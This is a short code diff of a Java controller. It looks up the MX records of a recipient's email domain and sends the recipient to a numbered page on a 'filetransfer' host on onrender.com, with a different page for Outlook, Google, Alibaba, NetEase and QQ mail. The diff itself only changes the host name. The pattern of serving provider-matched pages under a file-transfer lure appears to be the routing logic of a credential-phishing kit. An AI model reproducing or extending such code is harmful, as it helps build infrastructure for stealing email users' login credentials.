@@ -17,25 +17,25 @@ public class DnsResolverController {
 		String mailBox = dnsResolverService.checkDns(domainToCheck);
 		System.out.println(mailBox);
 		if (mailBox.contains("outlook.com.")) {
-			return "https://filetransfer-2.onrender.com/4.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/4.html?recipient="+recipient;
         } 
 		else if(mailBox.contains("mxhichina.com.")) {
-			return "https://filetransfer-2.onrender.com/1.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/1.html?recipient="+recipient;
 		}
 		else if(mailBox.contains("google.com.")) {
-			return "https://filetransfer-2.onrender.com/3.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/3.html?recipient="+recipient;
 		}
 		else if(mailBox.contains("mxmail.netease.com.")) {
-			return "https://filetransfer-2.onrender.com/2.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/2.html?recipient="+recipient;
 		}
 		else if(mailBox.contains("unknown")) {
-			return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/5.html?recipient="+recipient;
 		}
 		
 		else if(mailBox.contains("mxbiz1.qq.com.")) {
-			return "https://filetransfer-2.onrender.com/6.html?recipient="+recipient;
+			return "https://filetransfer3.onrender.com/6.html?recipient="+recipient;
 		}
 		
-		return "https://filetransfer-2.onrender.com/5.html?recipient="+recipient;
+		return "https://filetransfer3.onrender.com/5.html?recipient="+recipient;
 	}
 }
